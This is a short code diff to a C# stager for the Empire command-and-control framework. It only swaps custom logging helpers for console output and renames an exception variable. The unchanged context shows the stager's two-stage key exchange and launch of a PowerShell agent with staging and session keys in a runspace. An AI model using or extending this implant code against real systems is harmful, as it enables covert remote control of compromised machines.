@@ -57,12 +57,12 @@ namespace Empire
             try
             {
                 byte[] stage1response = stage1();
-                WriteOutputGood("Stage1 Complete");
+                Console.WriteLine("[+] Stage1 Complete");
 
                 byte[] stage2response = stage2(stage1response);
-                WriteOutputGood("Stage2 Complete");
+                Console.WriteLine("[+] Stage2 Complete");
 
-                WriteOutputGood("Launching Empire");
+                Console.WriteLine("[+] Launching Empire");
                 if (language == "powershell" || language == "ps" || language == "posh")
                 {
                     powershellEmpire(stage2response);
@@ -85,10 +85,10 @@ namespace Empire
                     execute();
                 }
             }
-            catch (Exception error)
+            catch (Exception ex)
             {
-                WriteOutputBad("Execution Failed");
-                WriteOutputBad(error.ToString());
+                Console.WriteLine("[-] Execution Failed");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
             finally
             {
@@ -167,7 +167,7 @@ namespace Empire
             execution += " -StagingKey \"" + stagingKey + "\"";
             execution += " -SessionKey \"" + key + "\"";
             execution += " -SessionID  \"" + id + "\"";
-            WriteOutputNeutral(execution);
+            Console.WriteLine("[+] {0}", execution);
 
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
